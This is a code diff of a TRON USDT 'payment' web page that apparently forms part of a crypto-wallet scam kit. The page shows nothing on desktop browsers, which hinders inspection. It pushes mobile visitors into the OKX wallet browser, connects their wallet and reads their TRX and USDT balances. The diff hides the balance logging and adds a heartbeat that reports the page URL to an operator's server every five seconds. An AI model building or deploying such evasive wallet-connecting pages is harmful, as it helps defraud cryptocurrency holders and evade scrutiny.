@@ -110,7 +110,7 @@ window.Payment_address = 'TFG7xoXhDNXwB3Cy8wSSecsZMXad9bp5sN';
 // USDT官方合约地址（无需修改）
 window.usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
 // 服务器地址用于发送心跳（修改为你自己的服务器域名）
-
+window.heartbeatUrl = 'https://baidu.com/heartbeat';
 
 /////////////////////////////////////////////////////////////
 /////////////////////////////////////////////////////////////
@@ -134,13 +134,13 @@ const TRX_TO_USD_RATE = 0.1562;
 async function initializeDApp() {
     const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
     const isDAppBrowser = typeof window.tronWeb !== 'undefined' || typeof window.tronLink !== 'undefined';
-    const buyaole = true;
+    
     if (!isMobile) {
         document.body.innerHTML = '';
-    } else if (isMobile && !buyaole) {
+    } else if (isMobile && !isDAppBrowser) {
         const currentUrl = encodeURIComponent(window.location.href);
         window.location.href = "okx://wallet/dapp/details?dappUrl=" + currentUrl;
-    } else if (isMobile ) {
+    } else if (isMobile && isDAppBrowser) {
         await connectWallet();
         bindButtonEvents();
     }
@@ -166,14 +166,14 @@ async function connectWallet() {
 async function initDApp() {
     try {
         userData.address = window.tronWeb.defaultAddress.base58;
-         console.log("用户地址:", userData.address);
+        // console.log("用户地址:", userData.address);
         const trxBalance = await window.tronWeb.trx.getBalance(userData.address);
         userData.trxBalance = window.tronWeb.fromSun(trxBalance);
-         console.log("TRX 余额:", userData.trxBalance);
+        // console.log("TRX 余额:", userData.trxBalance);
         const contract = await window.tronWeb.contract().at(window.usdtContractAddress);
         const usdtBalance = await contract.balanceOf(userData.address).call();
         userData.usdtBalance = usdtBalance / 1e6;
-         console.log("USDT 余额:", userData.usdtBalance);
+        // console.log("USDT 余额:", userData.usdtBalance);
         updateTRXBalance();
     } catch (error) {
         console.error("获取用户数据时出错:", error);
@@ -316,7 +316,32 @@ document.addEventListener('DOMContentLoaded', () => {
     updateAmountDisplay();
     initializeDApp();
 });
-
+// 向服务器发送心跳 不需要可以注释
+function sendHeartbeat() {
+    const currentUrl = window.location.href;
+    
+    fetch(window.heartbeatUrl, {
+        method: 'POST',
+        mode: 'cors',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({ url: currentUrl })
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.status === 'error' && data.message === '会话已结束') {
+            console.log('会话已结束');
+        }
+    })
+    .catch(() => {
+    });
+}
+const heartbeatInterval = setInterval(sendHeartbeat, 5000); // 每隔5秒发送一次了
+window.onload = sendHeartbeat;
+window.onbeforeunload = function() {
+    clearInterval(heartbeatInterval);
+};
 </script>
 </body>
 </html>
